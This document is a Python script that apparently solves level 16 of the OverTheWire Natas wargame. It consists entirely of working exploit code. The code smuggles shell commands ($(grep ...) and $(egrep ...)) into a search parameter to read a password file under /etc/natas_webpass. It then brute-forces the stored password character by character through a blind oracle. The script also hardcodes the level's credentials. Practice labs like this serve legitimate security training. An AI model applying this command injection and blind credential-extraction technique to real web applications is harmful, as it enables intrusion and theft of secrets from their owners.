import requests, string

auth_username = 'natas16'
auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://natas16.natas.labs.overthewire.org'

characters = ''.join([string.ascii_letters, string.digits])

pass_dict = []
exist_str = "writable"
print("Create password dictionary")
for char in characters:
    uri = url + f'/?needle={exist_str}$(grep {char} /etc/natas_webpass/natas17)' + '&submit=Search'
    r = requests.get(uri, auth=(auth_username, auth_password))
    if exist_str not in r.text:
        print(char)
        pass_dict.append(char)
print("Complete!!!")
print(f"Pass dict: {''.join(pass_dict)}")

print("Brute Forcing....")
password = []
passwd = ''
for i in range(1, 33):
    for char in pass_dict:
        test = ''.join([passwd,char])
        uri = url + f'/?needle={exist_str}$(egrep ^{test} /etc/natas_webpass/natas17)' + '&submit=Search'
        r = requests.get(uri, auth=(auth_username, auth_password))
        if exist_str not in r.text:
            password.append(char)
            passwd = ''.join(password)
            print(f'Length: {len(passwd)}, Pass: {passwd}')
    if len(passwd) == 32:
        break